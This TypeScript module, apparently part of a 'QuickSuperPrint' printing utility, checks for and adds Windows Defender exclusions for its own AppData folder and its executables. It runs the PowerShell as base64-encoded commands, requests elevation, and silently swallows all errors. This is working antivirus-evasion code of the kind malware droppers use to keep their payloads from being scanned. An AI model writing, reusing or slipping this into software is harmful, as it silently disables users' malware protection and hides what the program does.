import * as std from 'std'

const CHECK_SCRIPT = [
  '$cmd = Get-Command Add-MpPreference -ErrorAction SilentlyContinue',
  "if (-not $cmd) { Write-Output 'SKIP'; exit }",
  '$pref = Get-MpPreference -ErrorAction SilentlyContinue',
  "$path = $env:LOCALAPPDATA + '\\SuperPrint'",
  '$ok = $false',
  'if ($pref) {',
  '  $paths = @($pref.ExclusionPath)',
  '  $procs = @($pref.ExclusionProcess)',
  "  $ok = ($paths -contains $path) -and ($procs -contains 'QuickSuperPrint.exe') -and ($procs -contains 'QuickSuperPrint_Setup.exe')",
  '}',
  "if ($ok) { Write-Output 'EXISTS' } else { Write-Output 'MISSING' }",
].join('\n')

const ADD_SCRIPT = [
  "$ErrorActionPreference = 'Stop'",
  'Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\\SuperPrint"',
  "Add-MpPreference -ExclusionProcess 'QuickSuperPrint.exe'",
  "Add-MpPreference -ExclusionProcess 'QuickSuperPrint_Setup.exe'",
  "Write-Output 'DONE'",
].join('\n')

function encodedCommandBase64(script: string): string {
  let s = ''
  for (let i = 0; i < script.length; i++) {
    const c = script.charCodeAt(i)
    s += String.fromCharCode(c & 0xff, (c >> 8) & 0xff)
  }
  return btoa(s)
}

function runPs1Script(script: string): string {
  const cmd = 'powershell -NoProfile -NonInteractive -EncodedCommand ' + encodedCommandBase64(script)
  let out = ''
  try {
    const p = std.popen(cmd, 'r')
    if (!p) return out
    let line: string | null
    while ((line = p.getline()) !== null) out += line + '\n'
    p.close()
  } catch (_) {}
  return out
}

function runElevatedPs1(script: string): void {
  const encoded = encodedCommandBase64(script)
  const cmd = "powershell -NoProfile -NonInteractive -Command \"Start-Process -FilePath powershell -Verb RunAs -Wait -ArgumentList '-NoProfile','-NonInteractive','-EncodedCommand','" + encoded + "'\""
  try {
    const p = std.popen(cmd, 'r')
    if (p) {
      while (p.getline() !== null) {}
      p.close()
    }
  } catch (_) {}
}

export function ensureDefenderExclusions(): boolean {
  const check = runPs1Script(CHECK_SCRIPT)
  const result = check.trim().split('\n').pop() || ''
  if (result === 'EXISTS') return true
  if (result === 'SKIP') return false
  if (result !== 'MISSING') return false

  runElevatedPs1(ADD_SCRIPT)
  return true
}
